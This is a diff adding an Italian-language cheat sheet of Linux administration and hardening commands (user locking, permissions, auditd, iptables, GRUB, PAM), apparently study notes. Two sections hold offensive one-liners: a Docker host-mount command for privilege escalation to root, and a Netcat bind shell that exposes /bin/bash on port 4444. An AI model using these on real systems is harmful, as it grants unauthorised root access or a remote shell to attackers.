@@ -1,0 +1,122 @@
+1. Comandi per la gestione degli utenti
+
+Forzare il cambio password al prossimo login:
+passwd -e username
+
+Elencare tutti gli utenti normali (UID ≥ 1000):
+awk -F: '{ if ($3 >= 1000 && $3 != 65534) print $1 }' /etc/passwd
+
+Bloccare un utente:
+usermod -L username
+
+Sbloccare un utente:
+usermod -U username
+
+Cambiare la password di un utente:
+passwd username
+
+
+2. Comandi per gestire permessi e proprietà dei file
+
+Modificare i permessi di un file:
+chmod 600 file  # Solo root può leggere/scrivere
+chmod 700 directory  # Solo root può accedere
+
+Modificare il proprietario di un file:
+chown root:root file
+
+Visualizzare i permessi di un file:
+ls -l file
+
+Verificare chi può accedere a un file specifico:
+namei -l /path/to/file
+
+
+3. Comandi per configurare e proteggere il sistema
+
+Audit per monitorare accessi a file:
+Aggiungere una regola di audit:
+auditctl -w /path/to/file -p rwa -k key_name
+
+Visualizzare le regole di audit attive:
+auditctl -l
+
+Leggere i log di audit:
+ausearch -k key_name
+
+Trovare file con permessi insicuri:
+File scrivibili da tutti:
+find / -type f -perm -o+w 2>/dev/null
+
+Directory scrivibili da tutti:
+find / -type d -perm -o+w 2>/dev/null
+
+
+4. Comandi per gestire il firewall con iptables
+Permettere solo connessioni SSH:
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -j DROP
+
+Permettere solo SSH e traffico HTTP/HTTPS:
+iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT
+iptables -A INPUT -j DROP
+
+Bloccare tutto il traffico tranne HTTP/HTTPS:
+iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT
+iptables -A INPUT -j DROP
+
+Visualizzare le regole attive:
+iptables -L -v
+
+
+5. Comandi per cercare file e directory
+Trovare eseguibili con SUID:
+find / -perm -4000 -type f 2>/dev/null
+
+Trovare eseguibili con GUID:
+find / -perm -2000 -type f 2>/dev/null
+
+Trovare file modificabili da tutti:
+find / -type f -perm -o+w 2>/dev/null
+
+Trovare directory modificabili da tutti:
+find / -type d -perm -o+w 2>/dev/null
+
+
+6. Comandi per analizzare processi e file
+Mostrare processi con file descriptor aperti in una directory:
+lsof +D /var/log
+
+Trovare processi di un utente specifico:
+ps -u username
+
+
+7. Comandi utili per GRUB
+Generare una password per GRUB:
+grub-mkpasswd-pbkdf2
+
+Aggiornare la configurazione di GRUB:
+update-grub
+
+
+8. Comandi Docker per privilege escalation
+Accedere come root tramite Docker:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+
+9. Comandi generici per rete
+Verificare porte aperte sul sistema:
+netstat -tuln
+
+Connettersi a una shell remota con Netcat:
+nc <ip_address> <port>
+
+Avviare una shell remota su una porta con Netcat:
+nc -lvp 4444 -e /bin/bash
+
+
+10. Comandi per gestire PAM (Password Authentication Module)
+Configurare regole di password in PAM:
+Modifica /etc/security/pwquality.conf e usa:
+minlen=8
+minclass=3
